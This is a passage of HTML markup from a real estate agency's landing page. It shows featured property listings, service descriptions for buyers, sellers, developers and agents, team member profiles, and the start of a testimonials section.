                              d="M12 10h.01M12 14h.01M12 6h.01M16 10h.01M16 14h.01M16 6h.01M8 10h.01M8 14h.01M8 6h.01M9 22v-3a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v3"
                            ></path>
                            <rect
                              width="16"
                              height="20"
                              x="4"
                              y="2"
                              rx="2"
                            ></rect>
                          </g>
                        </svg>
                        <span>Developer Partnerships</span>
                      </div>
                    </a>
                  </div>
                  <div class="hero-contact-info">
                    <div class="hero-contact-item">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="24"
                        height="24"
                        viewBox="0 0 24 24"
                        class="hero-contact-icon"
                      >
                        <path
                          fill="none"
                          stroke="currentColor"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                          d="M13.832 16.568a1 1 0 0 0 1.213-.303l.355-.465A2 2 0 0 1 17 15h3a2 2 0 0 1 2 2v3a2 2 0 0 1-2 2A18 18 0 0 1 2 4a2 2 0 0 1 2-2h3a2 2 0 0 1 2 2v3a2 2 0 0 1-.8 1.6l-.468.351a1 1 0 0 0-.292 1.233a14 14 0 0 0 6.392 6.384"
                        ></path>
                      </svg>
                      <span>+1 (555) 123-4999</span>
                    </div>
                    <div class="hero-contact-item">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="24"
                        height="24"
                        viewBox="0 0 24 24"
                        class="hero-contact-icon"
                      >
                        <g
                          fill="none"
                          stroke="currentColor"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                        >
                          <path
                            d="m22 7l-8.991 5.727a2 2 0 0 1-2.009 0L2 7"
                          ></path>
                          <rect
                            width="20"
                            height="16"
                            x="2"
                            y="4"
                            rx="2"
                          ></rect>
                        </g>
                      </svg>
                      <span>partnerships@realtorshousingdevelopers</span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div class="hero-carousel-controls">
            <button
              aria-label="Previous slide"
              class="hero-carousel-control hero-carousel-control-prev"
            >
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="32"
                height="32"
                viewBox="0 0 24 24"
              >
                <path
                  fill="none"
                  stroke="currentColor"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                  stroke-width="2"
                  d="m15 18l-6-6l6-6"
                ></path>
              </svg>
            </button>
            <button
              aria-label="Next slide"
              class="hero-carousel-control hero-carousel-control-next"
            >
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="32"
                height="32"
                viewBox="0 0 24 24"
              >
                <path
                  fill="none"
                  stroke="currentColor"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                  stroke-width="2"
                  d="m9 18l6-6l-6-6"
                ></path>
              </svg>
            </button>
          </div>
          <div class="hero-carousel-indicators">
            <button
              aria-label="Go to slide 1"
              class="hero-carousel-indicator hero-carousel-indicator-active"
            ></button>
            <button
              aria-label="Go to slide 2"
              class="hero-carousel-indicator"
            ></button>
            <button
              aria-label="Go to slide 3"
              class="hero-carousel-indicator"
            ></button>
          </div>
        </section>
        <section class="showcase-video">
          <video
            autoplay="true"
            muted="true"
            loop="true"
            playsinline="true"
            src="https://videos.pexels.com/video-files/31454305/13413389_684_360_25fps.mp4"
            class="showcase-video-bg"
          ></video>
          <div class="showcase-video-overlay"></div>
          <div class="showcase-video-content">
            <h2 class="section-title">Featured Properties</h2>
            <p class="section-subtitle">
              Discover exceptional homes and investment opportunities
            </p>
            <div class="showcase-properties">
              <article class="showcase-property-card">
                <div class="showcase-property-image">
                  <img
                    src="https://images.pexels.com/photos/5997993/pexels-photo-5997993.jpeg?auto=compress&amp;cs=tinysrgb&amp;w=1500"
                    alt="Contemporary suburban home"
                  />
                  <span class="showcase-property-badge">New Listing</span>
                </div>
                <div class="showcase-property-details">
                  <div class="showcase-property-price">
                    <span>$1,245,000</span>
                  </div>
                  <h3 class="showcase-property-title">Modern Family Estate</h3>
                  <p class="showcase-property-location">
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      width="18"
                      height="18"
                      viewBox="0 0 24 24"
                      class="home-showcase-property-icon1"
                    >
                      <path
                        fill="none"
                        stroke="currentColor"
                        stroke-linecap="round"
                        stroke-linejoin="round"
                        stroke-width="2"
                        d="M14.106 5.553a2 2 0 0 0 1.788 0l3.659-1.83A1 1 0 0 1 21 4.619v12.764a1 1 0 0 1-.553.894l-4.553 2.277a2 2 0 0 1-1.788 0l-4.212-2.106a2 2 0 0 0-1.788 0l-3.659 1.83A1 1 0 0 1 3 19.381V6.618a1 1 0 0 1 .553-.894l4.553-2.277a2 2 0 0 1 1.788 0zm.894.211v15M9 3.236v15"
                      ></path>
                    </svg>
                    <span>Westwood Hills, CA</span>
                  </p>
                  <div class="showcase-property-specs">
                    <span class="showcase-property-spec">4 Beds</span>
                    <span class="showcase-property-spec">3.5 Baths</span>
                    <span class="showcase-property-spec">3,250 sqft</span>
                  </div>
                  <div class="showcase-property-actions">
                    <button class="btn btn-primary btn-sm">View Details</button>
                    <button class="btn btn-sm btn-outline">
                      Contact Agent
                    </button>
                  </div>
                </div>
              </article>
              <article class="showcase-property-card">
                <div class="showcase-property-image">
                  <img
                    src="https://images.pexels.com/photos/7031607/pexels-photo-7031607.jpeg?auto=compress&amp;cs=tinysrgb&amp;w=1500"
                    alt="Spacious modern house with lawn"
                  />
                  <span class="showcase-property-badge">Featured</span>
                </div>
                <div class="showcase-property-details">
                  <div class="showcase-property-price">
                    <span>$2,890,000</span>
                  </div>
                  <h3 class="showcase-property-title">
                    Executive Luxury Villa
                  </h3>
                  <p class="showcase-property-location">
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      width="18"
                      height="18"
                      viewBox="0 0 24 24"
                      class="home-showcase-property-icon2"
                    >
                      <path
                        fill="none"
                        stroke="currentColor"
                        stroke-linecap="round"
                        stroke-linejoin="round"
                        stroke-width="2"
                        d="M14.106 5.553a2 2 0 0 0 1.788 0l3.659-1.83A1 1 0 0 1 21 4.619v12.764a1 1 0 0 1-.553.894l-4.553 2.277a2 2 0 0 1-1.788 0l-4.212-2.106a2 2 0 0 0-1.788 0l-3.659 1.83A1 1 0 0 1 3 19.381V6.618a1 1 0 0 1 .553-.894l4.553-2.277a2 2 0 0 1 1.788 0zm.894.211v15M9 3.236v15"
                      ></path>
                    </svg>
                    <span>Beverly Heights, CA</span>
                  </p>
                  <div class="showcase-property-specs">
                    <span class="showcase-property-spec">6 Beds</span>
                    <span class="showcase-property-spec">5 Baths</span>
                    <span class="showcase-property-spec">5,800 sqft</span>
                  </div>
                  <div class="showcase-property-actions">
                    <button class="btn btn-primary btn-sm">View Details</button>
                    <button class="btn btn-sm btn-outline">
                      Contact Agent
                    </button>
                  </div>
                </div>
              </article>
              <article class="showcase-property-card">
                <div class="showcase-property-image">
                  <img
                    src="https://images.pexels.com/photos/280229/pexels-photo-280229.jpeg?auto=compress&amp;cs=tinysrgb&amp;w=1500"
                    alt="Contemporary house with garden"
                  />
                  <span class="showcase-property-badge">Hot Deal</span>
                </div>
                <div class="showcase-property-details">
                  <div class="showcase-property-price">
                    <span>$875,500</span>
                  </div>
                  <h3 class="showcase-property-title">
                    Charming Suburban Retreat
                  </h3>
                  <p class="showcase-property-location">
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      width="18"
                      height="18"
                      viewBox="0 0 24 24"
                      class="home-showcase-property-icon3"
                    >
                      <path
                        fill="none"
                        stroke="currentColor"
                        stroke-linecap="round"
                        stroke-linejoin="round"
                        stroke-width="2"
                        d="M14.106 5.553a2 2 0 0 0 1.788 0l3.659-1.83A1 1 0 0 1 21 4.619v12.764a1 1 0 0 1-.553.894l-4.553 2.277a2 2 0 0 1-1.788 0l-4.212-2.106a2 2 0 0 0-1.788 0l-3.659 1.83A1 1 0 0 1 3 19.381V6.618a1 1 0 0 1 .553-.894l4.553-2.277a2 2 0 0 1 1.788 0zm.894.211v15M9 3.236v15"
                      ></path>
                    </svg>
                    <span>Maple Grove, TX</span>
                  </p>
                  <div class="showcase-property-specs">
                    <span class="showcase-property-spec">3 Beds</span>
                    <span class="showcase-property-spec">2.5 Baths</span>
                    <span class="showcase-property-spec">2,400 sqft</span>
                  </div>
                  <div class="showcase-property-actions">
                    <button class="btn btn-primary btn-sm">View Details</button>
                    <button class="btn btn-sm btn-outline">
                      Contact Agent
                    </button>
                  </div>
                </div>
              </article>
              <article class="showcase-property-card">
                <div class="showcase-property-image">
                  <img
                    src="https://images.pexels.com/photos/8134850/pexels-photo-8134850.jpeg?auto=compress&amp;cs=tinysrgb&amp;w=1500"
                    alt="Modern house with sleek design"
                  />
                  <span class="showcase-property-badge">Exclusive</span>
                </div>
                <div class="showcase-property-details">
                  <div class="showcase-property-price">
                    <span>$1,650,000</span>
                  </div>
                  <h3 class="showcase-property-title">
                    Contemporary Masterpiece
                  </h3>
                  <p class="showcase-property-location">
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      width="18"
                      height="18"
                      viewBox="0 0 24 24"
                      class="home-showcase-property-icon4"
                    >
                      <path
                        fill="none"
                        stroke="currentColor"
                        stroke-linecap="round"
                        stroke-linejoin="round"
                        stroke-width="2"
                        d="M14.106 5.553a2 2 0 0 0 1.788 0l3.659-1.83A1 1 0 0 1 21 4.619v12.764a1 1 0 0 1-.553.894l-4.553 2.277a2 2 0 0 1-1.788 0l-4.212-2.106a2 2 0 0 0-1.788 0l-3.659 1.83A1 1 0 0 1 3 19.381V6.618a1 1 0 0 1 .553-.894l4.553-2.277a2 2 0 0 1 1.788 0zm.894.211v15M9 3.236v15"
                      ></path>
                    </svg>
                    <span>Newport Beach, CA</span>
                  </p>
                  <div class="showcase-property-specs">
                    <span class="showcase-property-spec">5 Beds</span>
                    <span class="showcase-property-spec">4 Baths</span>
                    <span class="showcase-property-spec">4,100 sqft</span>
                  </div>
                  <div class="showcase-property-actions">
                    <button class="btn btn-primary btn-sm">View Details</button>
                    <button class="btn btn-sm btn-outline">
                      Contact Agent
                    </button>
                  </div>
                </div>
              </article>
            </div>
          </div>
        </section>
        <section class="services-list">
          <div class="services-list-container">
            <div class="services-list-header">
              <h2 class="section-title">Our Services</h2>
              <p class="section-subtitle">
                Comprehensive real estate solutions for every need
              </p>
            </div>
            <div class="services-list-items">
              <article class="services-list-item">
                <div class="services-list-item-icon">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="48"
                    height="48"
                    viewBox="0 0 24 24"
                  >
                    <g
                      fill="none"
                      stroke="currentColor"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                      stroke-width="2"
                    >
                      <path
                        d="M15 21v-8a1 1 0 0 0-1-1h-4a1 1 0 0 0-1 1v8"
                      ></path>
                      <path
                        d="M3 10a2 2 0 0 1 .709-1.528l7-6a2 2 0 0 1 2.582 0l7 6A2 2 0 0 1 21 10v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"
                      ></path>
                    </g>
                  </svg>
                </div>
                <div class="services-list-item-content">
                  <h3 class="services-list-item-title">Home Buyer Services</h3>
                  <p class="services-list-item-description">
                    Expert guidance through every step of purchasing your dream
                    home, from property search to closing. Our experienced
                    agents provide market insights, negotiation expertise, and
                    personalized support tailored to your unique needs and
                    budget.
                  </p>
                  <ul class="services-list-item-features">
                    <li class="services-list-item-feature">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="20"
                        height="20"
                        viewBox="0 0 24 24"
                        class="services-list-feature-icon"
                      >
                        <path
                          fill="none"
                          stroke="currentColor"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                          d="M20 6L9 17l-5-5"
                        ></path>
                      </svg>
                      <span>Personalized property search</span>
                    </li>
                    <li class="services-list-item-feature">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="20"
                        height="20"
                        viewBox="0 0 24 24"
                        class="services-list-feature-icon"
                      >
                        <path
                          fill="none"
                          stroke="currentColor"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                          d="M20 6L9 17l-5-5"
                        ></path>
                      </svg>
                      <span>Market analysis and pricing insights</span>
                    </li>
                    <li class="services-list-item-feature">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="20"
                        height="20"
                        viewBox="0 0 24 24"
                        class="services-list-feature-icon"
                      >
                        <path
                          fill="none"
                          stroke="currentColor"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                          d="M20 6L9 17l-5-5"
                        ></path>
                      </svg>
                      <span>Professional negotiation</span>
                    </li>
                    <li class="services-list-item-feature">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="20"
                        height="20"
                        viewBox="0 0 24 24"
                        class="services-list-feature-icon"
                      >
                        <path
                          fill="none"
                          stroke="currentColor"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                          d="M20 6L9 17l-5-5"
                        ></path>
                      </svg>
                      <span>Closing coordination and support</span>
                    </li>
                  </ul>
                  <a href="#">
                    <div class="btn btn-link"><span>Learn More</span></div>
                  </a>
                </div>
              </article>
              <article class="services-list-item">
                <div class="services-list-item-icon">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="48"
                    height="48"
                    viewBox="0 0 24 24"
                  >
                    <g
                      fill="none"
                      stroke="currentColor"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                      stroke-width="2"
                    >
                      <path
                        d="m15.5 7.5l2.3 2.3a1 1 0 0 0 1.4 0l2.1-2.1a1 1 0 0 0 0-1.4L19 4m2-2l-9.6 9.6"
                      ></path>
                      <circle cx="7.5" cy="15.5" r="5.5"></circle>
                    </g>
                  </svg>
                </div>
                <div class="services-list-item-content">
                  <h3 class="services-list-item-title">Home Seller Services</h3>
                  <p class="services-list-item-description">
                    Maximize your property value with our comprehensive seller
                    services. From professional staging advice to strategic
                    marketing and expert negotiation, we ensure your home stands
                    out in the market and attracts qualified buyers.
                  </p>
                  <ul class="services-list-item-features">
                    <li class="services-list-item-feature">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="20"
                        height="20"
                        viewBox="0 0 24 24"
                        class="services-list-feature-icon"
                      >
                        <path
                          fill="none"
                          stroke="currentColor"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                          d="M20 6L9 17l-5-5"
                        ></path>
                      </svg>
                      <span>Competitive market analysis</span>
                    </li>
                    <li class="services-list-item-feature">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="20"
                        height="20"
                        viewBox="0 0 24 24"
                        class="services-list-feature-icon"
                      >
                        <path
                          fill="none"
                          stroke="currentColor"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                          d="M20 6L9 17l-5-5"
                        ></path>
                      </svg>
                      <span>Professional photography and virtual tours</span>
                    </li>
                    <li class="services-list-item-feature">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="20"
                        height="20"
                        viewBox="0 0 24 24"
                        class="services-list-feature-icon"
                      >
                        <path
                          fill="none"
                          stroke="currentColor"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                          d="M20 6L9 17l-5-5"
                        ></path>
                      </svg>
                      <span>Multi-channel marketing strategy</span>
                    </li>
                    <li class="services-list-item-feature">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="20"
                        height="20"
                        viewBox="0 0 24 24"
                        class="services-list-feature-icon"
                      >
                        <path
                          fill="none"
                          stroke="currentColor"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                          d="M20 6L9 17l-5-5"
                        ></path>
                      </svg>
                      <span>Expert listing price guidance</span>
                    </li>
                  </ul>
                  <a href="#">
                    <div class="btn btn-link"><span>Learn More</span></div>
                  </a>
                </div>
              </article>
              <article class="services-list-item">
                <div class="services-list-item-icon">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="48"
                    height="48"
                    viewBox="0 0 24 24"
                  >
                    <g
                      fill="none"
                      stroke="currentColor"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                      stroke-width="2"
                    >
                      <path
                        d="M12 10h.01M12 14h.01M12 6h.01M16 10h.01M16 14h.01M16 6h.01M8 10h.01M8 14h.01M8 6h.01M9 22v-3a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v3"
                      ></path>
                      <rect width="16" height="20" x="4" y="2" rx="2"></rect>
                    </g>
                  </svg>
                </div>
                <div class="services-list-item-content">
                  <h3 class="services-list-item-title">
                    Developer Partnerships
                  </h3>
                  <p class="services-list-item-description">
                    Strategic collaboration opportunities for housing developers
                    and investors. We provide market research, project
                    marketing, sales team coordination, and end-to-end support
                    for new construction and large-scale development projects.
                  </p>
                  <ul class="services-list-item-features">
                    <li class="services-list-item-feature">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="20"
                        height="20"
                        viewBox="0 0 24 24"
                        class="services-list-feature-icon"
                      >
                        <path
                          fill="none"
                          stroke="currentColor"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                          d="M20 6L9 17l-5-5"
                        ></path>
                      </svg>
                      <span>Market feasibility studies</span>
                    </li>
                    <li class="services-list-item-feature">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="20"
                        height="20"
                        viewBox="0 0 24 24"
                        class="services-list-feature-icon"
                      >
                        <path
                          fill="none"
                          stroke="currentColor"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                          d="M20 6L9 17l-5-5"
                        ></path>
                      </svg>
                      <span>Pre-construction sales campaigns</span>
                    </li>
                    <li class="services-list-item-feature">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="20"
                        height="20"
                        viewBox="0 0 24 24"
                        class="services-list-feature-icon"
                      >
                        <path
                          fill="none"
                          stroke="currentColor"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                          d="M20 6L9 17l-5-5"
                        ></path>
                      </svg>
                      <span>Dedicated sales team support</span>
                    </li>
                    <li class="services-list-item-feature">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="20"
                        height="20"
                        viewBox="0 0 24 24"
                        class="services-list-feature-icon"
                      >
                        <path
                          fill="none"
                          stroke="currentColor"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                          d="M20 6L9 17l-5-5"
                        ></path>
                      </svg>
                      <span>Investor and buyer network access</span>
                    </li>
                  </ul>
                  <a href="#">
                    <div class="btn btn-link"><span>Learn More</span></div>
                  </a>
                </div>
              </article>
              <article class="services-list-item">
                <div class="services-list-item-icon">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="48"
                    height="48"
                    viewBox="0 0 24 24"
                  >
                    <g
                      fill="none"
                      stroke="currentColor"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                      stroke-width="2"
                    >
                      <path d="m11 17l2 2a1 1 0 1 0 3-3"></path>
                      <path
                        d="m14 14l2.5 2.5a1 1 0 1 0 3-3l-3.88-3.88a3 3 0 0 0-4.24 0l-.88.88a1 1 0 1 1-3-3l2.81-2.81a5.79 5.79 0 0 1 7.06-.87l.47.28a2 2 0 0 0 1.42.25L21 4"
                      ></path>
                      <path
                        d="m21 3l1 11h-2M3 3L2 14l6.5 6.5a1 1 0 1 0 3-3M3 4h8"
                      ></path>
                    </g>
                  </svg>
                </div>
                <div class="services-list-item-content">
                  <h3 class="services-list-item-title">Agent Partnerships</h3>
                  <p class="services-list-item-description">
                    Join our network of top-performing real estate
                    professionals. We offer comprehensive training, marketing
                    resources, lead generation support, and a collaborative
                    environment that empowers agents to thrive and grow their
                    business.
                  </p>
                  <ul class="services-list-item-features">
                    <li class="services-list-item-feature">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="20"
                        height="20"
                        viewBox="0 0 24 24"
                        class="services-list-feature-icon"
                      >
                        <path
                          fill="none"
                          stroke="currentColor"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                          d="M20 6L9 17l-5-5"
                        ></path>
                      </svg>
                      <span>Continuing education and certification</span>
                    </li>
                    <li class="services-list-item-feature">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="20"
                        height="20"
                        viewBox="0 0 24 24"
                        class="services-list-feature-icon"
                      >
                        <path
                          fill="none"
                          stroke="currentColor"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                          d="M20 6L9 17l-5-5"
                        ></path>
                      </svg>
                      <span>Marketing and branding support</span>
                    </li>
                    <li class="services-list-item-feature">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="20"
                        height="20"
                        viewBox="0 0 24 24"
                        class="services-list-feature-icon"
                      >
                        <path
                          fill="none"
                          stroke="currentColor"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                          d="M20 6L9 17l-5-5"
                        ></path>
                      </svg>
                      <span>Lead generation systems</span>
                    </li>
                    <li class="services-list-item-feature">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="20"
                        height="20"
                        viewBox="0 0 24 24"
                        class="services-list-feature-icon"
                      >
                        <path
                          fill="none"
                          stroke="currentColor"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                          d="M20 6L9 17l-5-5"
                        ></path>
                      </svg>
                      <span>Mentorship and peer collaboration</span>
                    </li>
                  </ul>
                  <a href="#">
                    <div class="btn btn-link"><span>Learn More</span></div>
                  </a>
                </div>
              </article>
            </div>
          </div>
        </section>
        <section class="gallery-grid">
          <div class="gallery-grid-container">
            <div class="gallery-grid-header">
              <h2 class="section-title">Meet Our Team</h2>
              <p class="section-subtitle">
                Experienced professionals dedicated to your success
              </p>
            </div>
            <div class="gallery-grid-items">
              <article class="gallery-grid-item">
                <div class="gallery-grid-item-image">
                  <img
                    src="https://images.pexels.com/photos/8815915/pexels-photo-8815915.jpeg?auto=compress&amp;cs=tinysrgb&amp;w=1500"
                    alt="Real estate agent with house key"
                  />
                  <div class="gallery-grid-item-overlay"></div>
                </div>
                <div class="gallery-grid-item-content">
                  <h3 class="gallery-grid-item-title">Michael Anderson</h3>
                  <p class="gallery-grid-item-subtitle">
                    Senior Real Estate Agent
                  </p>
                  <p class="gallery-grid-item-description">
                    Luxury properties specialist with 15+ years experience in
                    high-end residential sales
                  </p>
                  <button class="btn btn-primary btn-sm">Contact Agent</button>
                </div>
              </article>
              <article class="gallery-grid-item">
                <div class="gallery-grid-item-image">
                  <img
                    src="https://images.pexels.com/photos/8730042/pexels-photo-8730042.jpeg?auto=compress&amp;cs=tinysrgb&amp;w=1500"
                    alt="Smiling woman real estate agent"
                  />
                  <div class="gallery-grid-item-overlay"></div>
                </div>
                <div class="gallery-grid-item-content">
                  <h3 class="gallery-grid-item-title">Sarah Mitchell</h3>
                  <p class="gallery-grid-item-subtitle">Buyer's Agent</p>
                  <p class="gallery-grid-item-description">
                    First-time homebuyer advocate helping families find their
                    perfect home
                  </p>
                  <button class="btn btn-primary btn-sm">Contact Agent</button>
                </div>
              </article>
              <article class="gallery-grid-item">
                <div class="gallery-grid-item-image">
                  <img
                    src="https://images.pexels.com/photos/15412672/pexels-photo-15412672.jpeg?auto=compress&amp;cs=tinysrgb&amp;w=1500"
                    alt="Confident real estate professional"
                  />
                  <div class="gallery-grid-item-overlay"></div>
                </div>
                <div class="gallery-grid-item-content">
                  <h3 class="gallery-grid-item-title">Jennifer Rodriguez</h3>
                  <p class="gallery-grid-item-subtitle">
                    Commercial Real Estate Expert
                  </p>
                  <p class="gallery-grid-item-description">
                    Specializing in commercial property investment and
                    development partnerships
                  </p>
                  <button class="btn btn-primary btn-sm">Contact Agent</button>
                </div>
              </article>
              <article class="gallery-grid-item">
                <div class="gallery-grid-item-image">
                  <img
                    src="https://images.pexels.com/photos/34462367/pexels-photo-34462367.jpeg?auto=compress&amp;cs=tinysrgb&amp;w=1500"
                    alt="Professional in sophisticated suit"
                  />
                  <div class="gallery-grid-item-overlay"></div>
                </div>
                <div class="gallery-grid-item-content">
                  <h3 class="gallery-grid-item-title">David Chen</h3>
                  <p class="gallery-grid-item-subtitle">
                    Housing Development Consultant
                  </p>
                  <p class="gallery-grid-item-description">
                    Expert in new construction projects and developer
                    partnerships
                  </p>
                  <button class="btn btn-primary btn-sm">Contact Agent</button>
                </div>
              </article>
              <article class="gallery-grid-item">
                <div class="gallery-grid-item-image">
                  <img
                    src="https://images.pexels.com/photos/8815878/pexels-photo-8815878.jpeg?auto=compress&amp;cs=tinysrgb&amp;w=1500"
                    alt="Real estate agent in office"
                  />
                  <div class="gallery-grid-item-overlay"></div>
                </div>
                <div class="gallery-grid-item-content">
                  <h3 class="gallery-grid-item-title">Robert Thompson</h3>
                  <p class="gallery-grid-item-subtitle">
                    Investment Property Advisor
                  </p>
                  <p class="gallery-grid-item-description">
                    Guiding investors to profitable real estate opportunities
                  </p>
                  <button class="btn btn-primary btn-sm">Contact Agent</button>
                </div>
              </article>
              <article class="gallery-grid-item">
                <div class="gallery-grid-item-image">
                  <img
                    src="https://images.pexels.com/photos/7736041/pexels-photo-7736041.jpeg?auto=compress&amp;cs=tinysrgb&amp;w=1500"
                    alt="Businesswoman with file"
                  />
                  <div class="gallery-grid-item-overlay"></div>
                </div>
                <div class="gallery-grid-item-content">
                  <h3 class="gallery-grid-item-title">Emily Johnson</h3>
                  <p class="gallery-grid-item-subtitle">Listing Specialist</p>
                  <p class="gallery-grid-item-description">
                    Marketing expert helping sellers achieve top dollar for
                    their properties
                  </p>
                  <button class="btn btn-primary btn-sm">Contact Agent</button>
                </div>
              </article>
            </div>
          </div>
        </section>
        <section class="testimonials-columns">
          <div class="testimonials-columns-background"></div>
          <div class="testimonials-columns-content">
            <div class="testimonials-columns-header">
              <h2 class="section-title">What Our Clients Say</h2>
              <p class="section-subtitle">
                Real experiences from satisfied buyers, sellers, and partners
              </p>
            </div>
            <div class="testimonials-columns-grid">
              <article class="testimonials-column">
                <div class="testimonials-column-icon">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="48"
                    height="48"
                    viewBox="0 0 24 24"
                  >
                    <path
                      fill="none"
                      stroke="currentColor"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                      stroke-width="2"
                      d="M16 3a2 2 0 0 0-2 2v6a2 2 0 0 0 2 2a1 1 0 0 1 1 1v1a2 2 0 0 1-2 2a1 1 0 0 0-1 1v2a1 1 0 0 0 1 1a6 6 0 0 0 6-6V5a2 2 0 0 0-2-2zM5 3a2 2 0 0 0-2 2v6a2 2 0 0 0 2 2a1 1 0 0 1 1 1v1a2 2 0 0 1-2 2a1 1 0 0 0-1 1v2a1 1 0 0 0 1 1a6 6 0 0 0 6-6V5a2 2 0 0 0-2-2z"
                    ></path>
                  </svg>
                </div>
                <div class="testimonials-column-rating">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="20"
                    height="20"
                    viewBox="0 0 24 24"
                    class="testimonials-column-star"
                  >
                    <path
                      fill="currentColor"
                      stroke="currentColor"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                      stroke-width="2"
                      d="M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.12 2.12 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.12 2.12 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.12 2.12 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.12 2.12 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.12 2.12 0 0 0 1.597-1.16z"
                    ></path></svg
                  ><svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="20"
                    height="20"
                    viewBox="0 0 24 24"
                    class="testimonials-column-star"
                  >
                    <path
                      fill="currentColor"
                      stroke="currentColor"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                      stroke-width="2"
                      d="M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.12 2.12 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.12 2.12 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.12 2.12 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.12 2.12 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.12 2.12 0 0 0 1.597-1.16z"
                    ></path></svg
                  ><svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="20"
                    height="20"
                    viewBox="0 0 24 24"
                    class="testimonials-column-star"
                  >
                    <path
                      fill="currentColor"
                      stroke="currentColor"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                      stroke-width="2"
                      d="M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.12 2.12 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.12 2.12 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.12 2.12 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.12 2.12 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.12 2.12 0 0 0 1.597-1.16z"
                    ></path></svg
                  ><svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="20"
                    height="20"
                    viewBox="0 0 24 24"
                    class="testimonials-column-star"
                  >
                    <path
                      fill="currentColor"
                      stroke="currentColor"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                      stroke-width="2"
